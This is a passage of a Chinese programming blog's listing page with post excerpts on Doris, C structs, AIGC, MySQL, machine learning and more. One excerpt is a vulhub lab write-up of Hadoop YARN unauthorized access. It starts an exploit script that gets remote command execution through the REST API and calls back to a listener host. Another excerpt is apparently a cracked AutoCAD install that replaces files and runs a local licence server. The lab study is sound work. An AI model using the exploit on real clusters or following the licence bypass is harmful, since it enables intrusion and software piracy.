			<a href="/posts/c768ffe408bf8d50ae645addaf5163b2/" rel="bookmark">
			基于Doris的日志存储分析平台（同步Kafka日志数据）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Kafka日志写入Doris 实现方式 采用 Routine Load 官方文档：Routine Load - Apache Doris采用 SparkStreaming实时消费Kafka后写入Doris，在日志记录场景（只写不删，不覆盖，不聚合...），我们使们前者；Doris 可以通过 Routine Load 导入方式持续消费 Kafka Topic 中的数据。在提交 Routine Load 作业后，Doris 会持续运行该导入作业，实时生成导入任务不断消费 Kakfa 集群中指定 Topic 中的消息。我们的日志数据由log4net推入Kafka后是一串JSON格式，大致如下格式： [ { "partition": 0, "offset": 49, "msg": "{\"log_timestamp\":1715752796717,\"business\":\"example.business.project\",\"service\":\"example.service\",\"host_ip\":\"YFB-CTO\",\"level\":\"INFO\",\"logger_name\":\"Web.Controllers.RoleController\",\"message\":\"########### \\u8FD9\\u662F\\u624B\\u52A8\\u8F93\\u51FA\\u7684\\u4E2D\\u6587\\u65E5\\u5FD7\\u4FE1\\u606F ###########\",\"request_path\":null,\"request_parameter\":null,\"request_method\":null,\"request_header\":null,\"status_code\":null,\"request_response_time\":0,\"exception\":null}", "timespan": 1715752796716, "date": "2024-05-15 13:59:56" } ] 创建 Routine Load 导入作业语法 CREATE ROUTINE LOAD [db.]job_name [ON tbl_name] [merge_type] [load_properties] [job_properties] FROM data_source [data_source_properties] [COMMENT "comment"] 在 Doris 中，使用 CREATE ROUTINE LOAD 命令，创建导入作业 CREATE ROUTINE LOAD biz_log_db.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c768ffe408bf8d50ae645addaf5163b2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8aca9cd777381e9b9d5b386be6672ced/" rel="bookmark">
			【C语言】探索结构体基础知识：简明概要
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		🔥引言
结构体是一种在编程中用来组织和存储相关数据的自定义数据类型，本章将会介绍结构体的基本概念和使用方法
🌈个人主页：是店小二呀
🌈C语言笔记专栏：C语言笔记
🌈C++笔记专栏： C++笔记
🌈喜欢的诗句:无人扶我青云志 我自踏雪至山巅
文章目录 【前文】类型分类 【正文】一、结构体的声明1.1 特殊声明(匿名结构体) 二、自引用三、typedef类型重命名相关的知识点四、结构体变量的创建和初始化（重点）4.1 结构体变量的创建4.2 结构体变量的初始化4.3 特殊初始化 五、结构成员访问操作符 【前文】 首先我们需要先搞清楚两个问题。结构体是什么？结构体有什么用呢？关于第一个问题，结构体是可以存储一个或者多个类型成员变量的集合关于第二个问题，结构体作用，可以更加灵活地处理、描述一个复杂的属性。比如:一个学生的属性就是名字，年纪之类的，那么我们就需要用到结构体去描述
类型分类 类型主要分为内置类型和自定义类型，内置类型由 C++ 语言标准指定的基础类型，比如char，int就是 属于内置类型，而联合体，枚举，包括今天学习的结构体也是属于自定义类型
【正文】 一、结构体的声明 struct 自定义名称 { int _age; char _name; }; 【注意】:
自定义名称是用于定义结构体类型，结构体内部只负责声明定义结构体类型关键字是struct结构体后面需要添加;这里_可以更好表示这是一个结构体成员(不写也是可以的)，提高可读性 1.1 特殊声明(匿名结构体) struct//匿名结构体 { int _age; char _name; }*s; struct { int _age; char _name; }p; 【问题】：s=&amp;p这里一段代码合法吗？
【回答】：
编译器会将这里两个变量看作两个不同类型的变量基本只能使用一次匿名结构体，不然会区分不开 二、自引用 【问题一】:如果结构体里面内嵌结构体？
【回答】：
如果将结构体看成一个容器，如果将一个等大容器放进去，那么容器是不是被挤满了，再分析下，这样子结构体变量大小会无穷大！ 【问题二】：如果想要结构体内嵌结构体，需要怎么做？
【回答】：
既然这个容器不能满足需求，可以找其他容器来保存数据，同时将它们之间创建联系—&gt;将容器一半装入数据，一半是另外容器的指针，通过指针找到另外的容器 struct Su { int _a; struct Su *_p; }; 三、typedef类型重命名相关的知识点 typedef struct { node *_p; }node; 【问题】:
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8aca9cd777381e9b9d5b386be6672ced/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b6100a9f8c902fea5ec7d4f83ebee6fc/" rel="bookmark">
			基于微信洗车预约小程序系统设计与实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 博主介绍：黄菊华老师《Vue.js入门与商城开发实战》《微信小程序商城开发》图书作者，CSDN博客专家，在线教育专家，CSDN钻石讲师；专注大学生毕业设计教育和辅导。
所有项目都配有从入门到精通的基础知识视频课程，学习后应对毕业设计答辩。
项目配有对应开发文档、开题报告、任务书、PPT、论文模版等
项目都录了发布和功能操作演示视频；项目的界面和功能都可以定制，包安装运行！！！
如果需要联系我，可以在CSDN网站查询黄菊华老师
在文章末尾可以获取联系方式
目的和意义 目的：本课题主要目标是设计并能够实现一个基于微信小程序洗车预约系统，前台用户使用小程序，后台管理使用Java+Mysql开发，后台使用了springboot框架；通过后台添加洗车场地信息和开放的洗车位信息，用户通过小程序登录，查看开放的洗车场地、选择洗车位和洗车时间段、提交洗车预约信息等。
意义：微信小程序洗车预约系统是计算机技术与座位管理相结合的产物，通过微信小程序洗车预约系统实现了对洗车使用的高效管理。随着计算机技术的不断提高,计算机已经深入到社会生活的各个角落.而采用人工去预约洗车的方法，不仅效率低，易出错，手续繁琐，而且耗费大量人力。为了满足高校管理洗车的使用，在工作人员的具备一定的计算机操作能力的前提下，特编此微信小程序洗车预约系统软件以提高座位的管理效率。
界面效果图 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f84062a03802225646d646cb260aa027/" rel="bookmark">
			搜索引擎如何融合AIGC：开启智能生成与检索新时代
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		随着人工智能技术的飞速发展，特别是生成式人工智能（AIGC）的兴起，搜索引擎行业正面临一场深刻的变革。AIGC不仅能够生成高质量的内容，还能根据用户需求即时定制信息，这为传统搜索引擎的模式增添了“生成”这一全新维度。本文将探讨搜索引擎如何与AIGC深度融合，分析这一融合过程的技术路径、应用实例以及对行业未来的影响。
一、AIGC技术简介 AIGC，即生成式人工智能，是一种能够自动生成文本、图像、音频、视频等多媒体内容的高级AI技术。基于深度学习模型，如Transformer架构的大规模语言模型（如GPT系列），AIGC通过学习海量数据，具备了理解语境、生成连贯且富有创造性的内容能力。
二、搜索引擎融合AIGC的技术路径 集成生成模块：搜索引擎需在其架构中嵌入AIGC模块，使得在处理用户查询时，不仅能检索现有网络资源，还能根据查询意图动态生成相关内容。这要求搜索引擎具备高度灵活的架构设计，以支持实时的生成任务执行。跨模态理解与交互：融合AIGC的搜索引擎应具备跨模态处理能力，即能够理解并整合文本、语音、图像等多种类型的数据，实现更加自然、直观的用户交互体验。个性化内容生成：利用用户行为数据、偏好设置及上下文信息，AIGC可以为每个用户提供定制化信息，包括解答、建议、总结或创作内容，增强用户体验的个性化程度。知识图谱与深度学习融合：搜索引擎需深化知识图谱的应用，并与AIGC技术相结合，提升内容生成的准确性和权威性，确保生成内容的可靠来源与高质量。 三、AIGC在搜索引擎中的应用实例 ● 智能问答：直接生成问题的答案，而非简单提供链接，如百度已尝试在搜索结果中加入由AI生成的直接回答。
● 内容创作辅助：为内容创作者提供灵感和初稿，如自动生成文章概要、写作建议等。
● 个性化推荐：根据用户历史行为生成个性化新闻摘要、商品描述或旅游攻略。
● 教育与培训：自动生成课程摘要、习题解答或定制化学习计划。
四、AIGC对搜索引擎的影响 用户体验革新：提供更直接、精准和个性化的搜索结果，缩短用户获取信息的路径。行业竞争格局重塑：搜索引擎公司需要加大在AI技术上的投入，以维持竞争优势。内容生态变化：AIGC可能改变内容生产方式，影响原创内容的创作动力与价值评估。挑战与风险：包括信息的真实性验证、版权问题及对SEO行业的潜在冲击。 五、技术伦理与监管的重要性 在搜索引擎与AIGC融合的进程中，技术伦理与监管机制的构建显得尤为重要。随着生成内容的普及，确保信息的真实性、客观性以及尊重原创版权成为不可忽视的课题。一方面，搜索引擎需要开发先进的算法来验证自动生成内容的准确性，避免误导用户；另一方面，应建立一套完善的审核机制，对生成内容进行质量把关，及时剔除不实或有害信息。
同时，对于用户隐私的保护也是不容忽视的方面。在利用用户数据进行个性化内容生成时，必须严格遵守数据保护法规，实现数据的匿名化处理和安全存储，保障用户个人信息的安全与隐私权不受侵犯。此外，对于AIGC可能引发的原创内容价值稀释问题，行业内部应探索建立合理的激励机制，鼓励原创与创新，维护健康的创作生态。
六、促进开放合作与标准制定 为了推动搜索引擎与AIGC融合技术的健康发展，加强行业内以及跨行业的开放合作至关重要。这包括技术共享、最佳实践交流、标准化制定等方面。通过建立统一的行业标准和协议，可以有效促进技术兼容性，减少市场碎片化，确保用户无论使用何种搜索引擎，都能享受到一致且高质量的搜索体验。
同时，跨学科研究也是推动技术创新的关键。结合计算机科学、心理学、社会学等多个领域的知识，深入研究用户行为与需求，可以进一步优化AIGC在搜索引擎中的应用策略，使之更加人性化、智能化。
七、持续探索与创新 面对AIGC带来的无限可能，搜索引擎企业应当保持持续的探索精神，不断推进技术创新与服务升级。这不仅意味着要在算法效率、内容多样性上下功夫，还要积极探索AIGC在新兴领域的应用，比如在虚拟现实、增强现实环境中的信息检索与内容生成，以及在元宇宙等未来互联网形态中的角色定位。
此外，教育与公众意识的提升同样重要。通过教育引导用户正确理解和使用AIGC赋能的搜索引擎，提高公众的信息素养，有助于形成一个更加理性和活跃的网络交流环境。
八、前景与展望 搜索引擎与AIGC的深度融合预示着搜索技术将迈向更高层次的认知智能。未来，搜索引擎将更加注重理解用户的隐含需求，提供更加丰富、多样的信息输出形式，并在保护用户隐私与确保内容质量的前提下，推动互联网信息生态的良性发展。然而，伴随技术进步，如何平衡自动化生成内容的效率与真实性、创意保护等议题，将是行业持续探索的方向。
九、结语 AIGC的引入，标志着搜索引擎正从传统的信息检索工具向智能信息助手转变。这一融合不仅是技术层面的革新，更是对互联网内容消费模式和信息传播方式的一次深刻重构。随着技术的成熟与应用的拓展，未来的搜索引擎将更加智能、高效，为用户提供前所未有的搜索体验。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8292ba1f9f61f90bdae8cdb277e33b47/" rel="bookmark">
			未授权访问：Hadoop 未授权访问漏洞
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1、漏洞原理
2、环境搭建
3、未授权访问
4、通过REST API命令执行
防御手段
今天继续学习各种未授权访问的知识和相关的实操实验，一共有好多篇，内容主要是参考先知社区的一位大佬的关于未授权访问的好文章，还有其他大佬总结好的文章：
这里附上大佬的好文章链接：常见未授权访问漏洞总结 - 先知社区
我在这只是学习大佬总结好的相关的知识和实操实验，那么废话不多说，开整。
第十三篇是关于Hadoop的未授权访问
1、漏洞原理 Hadoop是一个由Apache基金会所开发的分布式系统基础架构，由于服务器直接在开放了 Hadoop 机器 HDFS 的 50070 web 端口及部分默认服务端口，黑客可以通过命令行操作多个目录下的数据，如进行删除，下载，目录浏览甚至命令执行等操作，产生极大的危害。
2、环境搭建 mkdir hadoop cd hadoop/ wget https://raw.githubusercontent.com/vulhub/vulhub/master/hadoop/unauthorized-yarn/docker-compose.yml wget https://raw.githubusercontent.com/vulhub/vulhub/master/hadoop/unauthorized-yarn/exploit.py ​ #或者利用DownGit下载https://github.com/vulhub/vulhub/tree/master/hadoop/unauthorized-yarn DownGit网址：https://minhaskamal.github.io/DownGit/#/home docker-compose build &amp;&amp; docker-compose up -d #编译并启动环境 3、未授权访问 访问 http://192.168.159.202/cluster
可以看到在没有输入任何口令的情况下未授权访问了
4、通过REST API命令执行 利用过程：
在本地监听端口 &gt;&gt; 创建Application &gt;&gt; 调用Submit Application API提交
本地监听9999端口
EXP:
#!/usr/bin/env python ​ import requests ​ target = 'http://192.168.18.129:8088/' lhost = '192.168.18.138' # put your local host ip here, and listen at port 9999 ​ url = target + 'ws/v1/cluster/apps/new-application' resp = requests.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8292ba1f9f61f90bdae8cdb277e33b47/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2bf6bae41bf45b1721a9719eafb1a349/" rel="bookmark">
			MySQL大师课：36秘技解锁数据库性能与管理新高度？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		🔥关注墨瑾轩，带你探索Java的奥秘！🚀
🔥超萌技术攻略，轻松晋级编程高手！🚀
🔥技术宝库已备好，就等你来挖掘！🚀
🔥订阅墨瑾轩，智趣学习不孤单！🚀
🔥即刻启航，编程之旅更有趣！🚀
引言：MySQL探秘——开发规范的不朽地图 欢迎来到MySQL的奇幻岛屿，这里是数据存储的圣地，也是每位开发者必经的冒险之旅。在这片充满机遇与挑战的土地上，一份详尽且风趣的开发规范指南就如同藏宝图一般珍贵。接下来，我们将深入这座数据库的腹地，从基础到进阶，从理论到实践，一步步揭开MySQL开发的神秘面纱。系好安全带，带上你的好奇心，咱们这就启程！
正文：MySQL开发的深度剖析 1. 环境搭建与配置
就像航海前要检查船只一样，开发前的环境准备至关重要。确保安装了最新版的MySQL Server，同时配置好环境变量。别忘了安装一个趁手的客户端工具，如MySQL Workbench或Navicat，它们可是你的望远镜和罗盘。
Bash
1# 示例：Linux环境下安装MySQL 2sudo apt-get update 3sudo apt-get install mysql-server 注：apt-get命令适用于基于Debian的系统，其他系统请使用相应的包管理器。
2. 数据库设计的艺术
数据库设计是一门艺术，也是一门科学。遵循范式（1NF、2NF、3NF）来设计表结构，避免数据冗余和异常。比如，一个用户表可能包括user_id, username, email等字段，而地址信息则应放在另一个表中，通过外键关联。
Sql
1CREATE TABLE users ( 2 user_id INT AUTO_INCREMENT PRIMARY KEY, 3 username VARCHAR(255) NOT NULL UNIQUE, 4 email VARCHAR(255) UNIQUE 5); 6 7CREATE TABLE addresses ( 8 address_id INT AUTO_INCREMENT PRIMARY KEY, 9 user_id INT, 10 street VARCHAR(255), 11 city VARCHAR(255), 12 FOREIGN KEY (user_id) REFERENCES users(user_id) 13); 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2bf6bae41bf45b1721a9719eafb1a349/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/37427c7bb1519d7fc3fe9b1e3954c4e2/" rel="bookmark">
			机器学习R-计算大题-TYUT
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		阅读前请看评论区说明O(∩_∩)O
机器学习系列完结撒花(*^▽^*)
考试计算都是换个数字的事，都很简单，最后一门口考试加油！
一.简单线性回归 带入公式算即可
其中x表示特征值，w表示权重，b表示偏置，y表示标签
二.查准率，查全率 记清公式，分清TN FP FN TP
对应为：
TN FP
FN TP
三. 梯度下降算法 四．损失函数
五．构建card决策树
利用基尼指数进行划分选择，分类树选择基尼指数最小，回归树选择平方误差最小。
例如本题就是研究4个属性对于有无贷款得影响。
年龄A1的基尼指数：
有工作A2有房子A3的基尼指数
信贷A4的基尼指数
发现A3最小，取A3为根，分成两个叶节点
再在没自己房子的样本进行A1，A2，A4的比较
重新计算基尼指数：
有工作A2基尼指数为0，作为第二个最优切分点。
3,13,14均可贷款，本题结束。
六．BP神经网络计算输出值
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9d62d15a3d23fa1dc3d2df611c10bf4d/" rel="bookmark">
			Autodesk AutoCAD 2025 Mac软件安装包下载CAD 2025 Mac安装教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		安装
步骤
1，双击打开下载好的安装包。
2，双击installautodeskautocad2025for Mac 启动安装程序。
3，安装准备中...
4，输入电脑密码。
5，勾选同意使用条款 然后点击下一步。
6，点击安装。
7，软件安装中...
8，安装结束点击关闭。
9，返回打开镜像 从右依次安装。
10，点击继续。
11，点击继续。
12，点击继续。
13，点击安装。
14，输入电脑密码。
15，安装中...
16，安装结束点击关闭。
17，选择第二个 双击打开。
18，点击继续。
19，点击安装。
20，输入电脑密码。
21，安装中...
22，安装结束点击关闭。
23，选择第三个双击打开。
24，点击继续。
25，点击安装。
26，输入电脑密码。
27，安装结束点击关闭。
28，返回镜像点击替换文件。
29，第一个拖到第一个文件夹里面其余两个拖到下面那个文件夹里面去。
30，点击替换。
31，输入电脑密码。
32，将下面两个拖到右边第二个文件夹。
33，点击替换。
34，输入电脑密码。
35，拖到右边第二个文件夹。
36，输入电脑密码。
37，替换完成后，应用程序-实用工具中打开终端，执行第一个命令cd /usr/local/flexnetServer ，回车
38，然后执行第二个命令./lmgrd -c license.dat
39，打开安装好的软件 选择使用网络许可。
40，输入27080@localhost，点击完成
41，点击确定。
42，打开软件。
43，软件加载中...
44，安装完成，OK。
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/352/">«</a>
	<span class="pagination__item pagination__item--current">353/621</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/354/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大咖.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>